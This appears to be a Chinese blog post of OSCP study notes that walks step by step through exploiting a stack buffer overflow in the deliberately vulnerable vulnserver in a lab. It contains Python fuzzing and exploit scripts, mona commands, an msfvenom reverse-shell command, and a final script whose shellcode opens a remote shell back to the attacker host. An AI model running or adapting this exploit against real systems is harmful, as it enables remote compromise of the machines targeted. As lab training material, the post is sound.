---
layout:     post
title:      缓冲区溢出漏洞攻击之Shellcode编写
subtitle:   缓冲区溢出漏洞攻击之Shellcode编写
date:       2019-09-27
author:     看不尽的尘埃
header-img: img/post-bg-ios9-web.jpg
catalog: 	 true
tags:
    - 安全开发
---
# 前言
最近打算考一下OSCP，因为里面有一题是考缓冲区溢出的，所以上网去学了一下缓冲区溢出漏洞的相关知识，下面记录一下自己编写的第一个通过缓冲区溢出漏洞反弹Shell的过程。
# 0x00 环境配置
需要用到的工具或者插件如下：
* ImmunityDebugger(安装在Win10上)
* Mona(安装在Win10上)
* vulnserver(安装在Win10上)

环境：
* Kali Linux 为攻击机
* Win10 上搭建 vulnserver

首先开启vulnserver：
![图片](../../../../img/Buffer_Overflow_shell_1.png)

尝试使用Kali Linux去连接这个服务，通过输入HELP可以获取到所有的命令提示，本文主要是对TRUN命令的Fuzzing:
![图片](../../../../img/Buffer_Overflow_shell_2.png)
# 0x01 Fuzzing
首先编写一个Fuzz脚本，如下图所示，脚本的意思就是写一个循环，每次增加200个字节发送到Win10 9999端口对应的vulnserver上：
```
#!/usr/bin/python
import socket


buffer = ["A"]
count = 100
while len(buffer) <=30:
    buffer.append("A"*count)
    count = count + 200
for string in buffer:
    print("Fuzzing with %s bytes..." % len(string))
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    connect = s.connect(("10.20.40.95",9999))
    s.send(('TRUN /.:/'+string))
    s.close()
```

写完之后，我们可以运行这个脚本，从下图可以看到当我们发送到5900字节的时候，程序结束了。这是因为vulnserver崩溃了。
![图片](../../../../img/Buffer_Overflow_shell_3.png)

该步骤总结：1、需要使用python2，python3报错(TypeError: a bytes-like object is required, not 'str');2、一开始对脚本不太理解；
# 0x02 寻找偏移量
虽然我们知道了5900字节的时候vulnserver会崩溃，但是我们不能很明确的知道，从什么时候开始，因此我们可以生成有规律的code去验证，这里可以使用MSF中的Ruby脚本：
![图片](../../../../img/Buffer_Overflow_shell_4.png)

然后修改python代码，将原先的buffer变量赋值为生成有规律的5900个字符串：
```
#!/usr/bin/python
# -*- coding: UTF-8 -*-
import socket


buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9Fh0Fh1Fh2Fh3Fh4Fh5Fh6Fh7Fh8Fh9Fi0Fi1Fi2Fi3Fi4Fi5Fi6Fi7Fi8Fi9Fj0Fj1Fj2Fj3Fj4Fj5Fj6Fj7Fj8Fj9Fk0Fk1Fk2Fk3Fk4Fk5Fk6Fk7Fk8Fk9Fl0Fl1Fl2Fl3Fl4Fl5Fl6Fl7Fl8Fl9Fm0Fm1Fm2Fm3Fm4Fm5Fm6Fm7Fm8Fm9Fn0Fn1Fn2Fn3Fn4Fn5Fn6Fn7Fn8Fn9Fo0Fo1Fo2Fo3Fo4Fo5Fo6Fo7Fo8Fo9Fp0Fp1Fp2Fp3Fp4Fp5Fp6Fp7Fp8Fp9Fq0Fq1Fq2Fq3Fq4Fq5Fq6Fq7Fq8Fq9Fr0Fr1Fr2Fr3Fr4Fr5Fr6Fr7Fr8Fr9Fs0Fs1Fs2Fs3Fs4Fs5Fs6Fs7Fs8Fs9Ft0Ft1Ft2Ft3Ft4Ft5Ft6Ft7Ft8Ft9Fu0Fu1Fu2Fu3Fu4Fu5Fu6Fu7Fu8Fu9Fv0Fv1Fv2Fv3Fv4Fv5Fv6Fv7Fv8Fv9Fw0Fw1Fw2Fw3Fw4Fw5Fw6Fw7Fw8Fw9Fx0Fx1Fx2Fx3Fx4Fx5Fx6Fx7Fx8Fx9Fy0Fy1Fy2Fy3Fy4Fy5Fy6Fy7Fy8Fy9Fz0Fz1Fz2Fz3Fz4Fz5Fz6Fz7Fz8Fz9Ga0Ga1Ga2Ga3Ga4Ga5Ga6Ga7Ga8Ga9Gb0Gb1Gb2Gb3Gb4Gb5Gb6Gb7Gb8Gb9Gc0Gc1Gc2Gc3Gc4Gc5Gc6Gc7Gc8Gc9Gd0Gd1Gd2Gd3Gd4Gd5Gd6Gd7Gd8Gd9Ge0Ge1Ge2Ge3Ge4Ge5Ge6Ge7Ge8Ge9Gf0Gf1Gf2Gf3Gf4Gf5Gf6Gf7Gf8Gf9Gg0Gg1Gg2Gg3Gg4Gg5Gg6Gg7Gg8Gg9Gh0Gh1Gh2Gh3Gh4Gh5Gh6Gh7Gh8Gh9Gi0Gi1Gi2Gi3Gi4Gi5Gi6Gi7Gi8Gi9Gj0Gj1Gj2Gj3Gj4Gj5Gj6Gj7Gj8Gj9Gk0Gk1Gk2Gk3Gk4Gk5Gk6Gk7Gk8Gk9Gl0Gl1Gl2Gl3Gl4Gl5Gl6Gl7Gl8Gl9Gm0Gm1Gm2Gm3Gm4Gm5Gm6Gm7Gm8Gm9Gn0Gn1Gn2Gn3Gn4Gn5Gn6Gn7Gn8Gn9Go0Go1Go2Go3Go4Go5Go6Go7Go8Go9Gp0Gp1Gp2Gp3Gp4Gp5Gp6Gp7Gp8Gp9Gq0Gq1Gq2Gq3Gq4Gq5Gq6Gq7Gq8Gq9Gr0Gr1Gr2Gr3Gr4Gr5Gr6Gr7Gr8Gr9Gs0Gs1Gs2Gs3Gs4Gs5Gs6Gs7Gs8Gs9Gt0Gt1Gt2Gt3Gt4Gt5Gt6Gt7Gt8Gt9Gu0Gu1Gu2Gu3Gu4Gu5Gu6Gu7Gu8Gu9Gv0Gv1Gv2Gv3Gv4Gv5Gv6Gv7Gv8Gv9Gw0Gw1Gw2Gw3Gw4Gw5Gw6Gw7Gw8Gw9Gx0Gx1Gx2Gx3Gx4Gx5Gx6Gx7Gx8Gx9Gy0Gy1Gy2Gy3Gy4Gy5Gy6Gy7Gy8Gy9Gz0Gz1Gz2Gz3Gz4Gz5Gz6Gz7Gz8Gz9Ha0Ha1Ha2Ha3Ha4Ha5Ha6Ha7Ha8Ha9Hb0Hb1Hb2Hb3Hb4Hb5Hb6Hb7Hb8Hb9Hc0Hc1Hc2Hc3Hc4Hc5Hc6Hc7Hc8Hc9Hd0Hd1Hd2Hd3Hd4Hd5Hd6Hd7Hd8Hd9He0He1He2He3He4He5He6He7He8He9Hf0Hf1Hf2Hf3Hf4Hf5Hf6Hf7Hf8Hf9Hg0Hg1Hg2Hg3Hg4Hg5Hg6Hg7Hg8Hg9Hh0Hh1Hh2Hh3Hh4Hh5Hh6Hh7Hh8Hh9Hi0Hi1Hi2Hi3Hi4Hi5Hi6Hi7Hi8Hi9Hj0Hj1Hj2Hj3Hj4Hj5Hj6Hj7Hj8Hj9Hk0Hk1Hk2Hk3Hk4Hk5Hk6Hk7Hk8Hk9Hl0Hl1Hl2Hl3Hl4Hl5Hl6Hl7Hl8Hl9Hm0Hm1Hm2Hm3Hm4Hm5Hm6Hm7Hm8Hm9Hn0Hn1Hn2Hn3Hn4Hn5Hn6Hn7Hn8Hn9Ho0Ho1Ho2Ho3Ho4Ho5Ho"
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect = s.connect(("10.20.40.95",9999))
s.send(('TRUN /.:/'+buffer))
s.close()
```

在Win10上打开ImmunityDebugger，可以通过两种方式添加，一种是通过打开进程，另一种是通过打开exe文件来调试，我是没找到这个进程然后通过exe打开的。使用ImmunityDebugger打开程序后，我们再切换到Kali Linux上去运行Python脚本：
![图片](../../../../img/Buffer_Overflow_shell_5.png)


从上图可以看到程序再次崩溃了，这个时候查看它的EIP的值为386F4337，通过使用MSF Ruby插件得到偏移量为2003：
![图片](../../../../img/Buffer_Overflow_shell_6.png)

# 0x03 覆盖EIP
知道了偏移量，我们就可以精确的覆盖EIP的值了。
修改Python脚本发送2003个的A，4个B，我们可以看到如下图所示的情况，EIP被覆盖成了42424242：
![图片](../../../../img/Buffer_Overflow_shell_7.png)

# 0x04 检查是否有坏字节
## 发送坏字节
现在，我们需要找到程序是否存在坏字节，修改Python代码：
```
#!/usr/bin/python
# -*- coding: UTF-8 -*-
import socket

badchars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)
shellcode = 'A'*2003 + 'B'*4 +badchars
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect = s.connect(("10.20.40.95",9999))
s.send(('TRUN /.:/'+shellcode))
s.close()
```

## 查看ESP--->follow in dump
运行Python脚本后，让程序继续崩溃，我们可以通过选中ESP，右键选择Follow in Dump这个选项，来看是否存在坏字节：
![图片](../../../../img/Buffer_Overflow_shell_8.png)
从下图看出，是没有坏字节的，如果有坏字节的话，坏字节会显示为B0：
![图片](../../../../img/Buffer_Overflow_shell_9.png)

# 0x05 找到正确的模块
完事具备，只欠东风，我们只差找一个正确的模块了，通过mona查找：
```
!mona modules
```
找到了1个都为false的dll和一个都为false的exe文件，选dll文件：
![图片](../../../../img/Buffer_Overflow_shell_10.png)
使用MSF Ruby插件生成JMP ESP的十六进制代码：
![图片](../../../../img/Buffer_Overflow_shell_11.png)
通过以下命令寻找essfunc.dll中是否存在FFE4的字节：
```
!mona find -s "\xff\xe4" -m essfunc.dll
```
从下图可以看到，查找到了9处，我们可以选一个进行，我这边选了第一个地址625011AF。
![图片](../../../../img/Buffer_Overflow_shell_12.png)

# 0x06 编写Shellcode
终于到了最后的一步，生成反弹Shell的ShellCode。
通过msfvenom生成反弹shell的shellcode:
```
msfvenom -p windows/shell_reverse_tcp lhost=10.20.40.96 lport=7777 EXITFUNC=thread -f c -a x86 --platform windows -b "\x00" -v shellcode
```
然后修改Python代码，\x90是起延时作用，\xaf\x11\x50\x62倒过来是因为在栈中的“先进后出,后进先出”的。
```
#!/usr/bin/python
# -*- coding: UTF-8 -*-
import socket
exp = (
"\xda\xdb\xba\xd9\x11\x1c\xd4\xd9\x74\x24\xf4\x58\x33\xc9\xb1"
"\x52\x83\xc0\x04\x31\x50\x13\x03\x89\x02\xfe\x21\xd5\xcd\x7c"
"\xc9\x25\x0e\xe1\x43\xc0\x3f\x21\x37\x81\x10\x91\x33\xc7\x9c"
"\x5a\x11\xf3\x17\x2e\xbe\xf4\x90\x85\x98\x3b\x20\xb5\xd9\x5a"
"\xa2\xc4\x0d\xbc\x9b\x06\x40\xbd\xdc\x7b\xa9\xef\xb5\xf0\x1c"
"\x1f\xb1\x4d\x9d\x94\x89\x40\xa5\x49\x59\x62\x84\xdc\xd1\x3d"
"\x06\xdf\x36\x36\x0f\xc7\x5b\x73\xd9\x7c\xaf\x0f\xd8\x54\xe1"
"\xf0\x77\x99\xcd\x02\x89\xde\xea\xfc\xfc\x16\x09\x80\x06\xed"
"\x73\x5e\x82\xf5\xd4\x15\x34\xd1\xe5\xfa\xa3\x92\xea\xb7\xa0"
"\xfc\xee\x46\x64\x77\x0a\xc2\x8b\x57\x9a\x90\xaf\x73\xc6\x43"
"\xd1\x22\xa2\x22\xee\x34\x0d\x9a\x4a\x3f\xa0\xcf\xe6\x62\xad"
"\x3c\xcb\x9c\x2d\x2b\x5c\xef\x1f\xf4\xf6\x67\x2c\x7d\xd1\x70"
"\x53\x54\xa5\xee\xaa\x57\xd6\x27\x69\x03\x86\x5f\x58\x2c\x4d"
"\x9f\x65\xf9\xc2\xcf\xc9\x52\xa3\xbf\xa9\x02\x4b\xd5\x25\x7c"
"\x6b\xd6\xef\x15\x06\x2d\x78\x10\xc3\x05\x18\x4c\xe9\x55\xc6"
"\xed\x64\xb3\x9c\xfd\x20\x6c\x09\x67\x69\xe6\xa8\x68\xa7\x83"
"\xeb\xe3\x44\x74\xa5\x03\x20\x66\x52\xe4\x7f\xd4\xf5\xfb\x55"
"\x70\x99\x6e\x32\x80\xd4\x92\xed\xd7\xb1\x65\xe4\xbd\x2f\xdf"
"\x5e\xa3\xad\xb9\x99\x67\x6a\x7a\x27\x66\xff\xc6\x03\x78\x39"
"\xc6\x0f\x2c\x95\x91\xd9\x9a\x53\x48\xa8\x74\x0a\x27\x62\x10"
"\xcb\x0b\xb5\x66\xd4\x41\x43\x86\x65\x3c\x12\xb9\x4a\xa8\x92"
"\xc2\xb6\x48\x5c\x19\x73\x68\xbf\x8b\x8e\x01\x66\x5e\x33\x4c"
"\x99\xb5\x70\x69\x1a\x3f\x09\x8e\x02\x4a\x0c\xca\x84\xa7\x7c"
"\x43\x61\xc7\xd3\x64\xa0"
)
shellcode = 'A'*2003 + '\xaf\x11\x50\x62' + '\x90'*32 + exp
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect = s.connect(("10.20.40.95",9999))
s.send(('TRUN /.:/'+shellcode))
s.close()
```

最终成功溢出：
![图片](../../../../img/Buffer_Overflow_shell_13.png)
